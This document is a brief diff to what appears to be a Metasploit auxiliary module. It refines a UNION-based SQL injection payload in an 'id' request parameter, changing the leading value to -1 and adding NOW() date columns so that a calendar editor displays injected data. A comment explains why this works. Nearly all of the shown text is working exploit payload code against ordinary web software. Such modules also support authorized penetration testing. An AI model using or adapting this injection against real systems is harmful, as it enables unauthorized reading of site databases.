@@ -56,7 +56,9 @@ class MetasploitModule < Msf::Auxiliary
         'action' => 'data_management',
         'cpmvc_do_action' => 'mvparse',
         'f' => 'edit',
-        'id' => "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
+        # Exclude real events so the editor reads our UNION row first. Dates must be
+        # non-null because the editor parses them before displaying the location.
+        'id' => "-1 UNION ALL SELECT NULL,NULL,NOW(),NOW(),NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
       }
     })
 
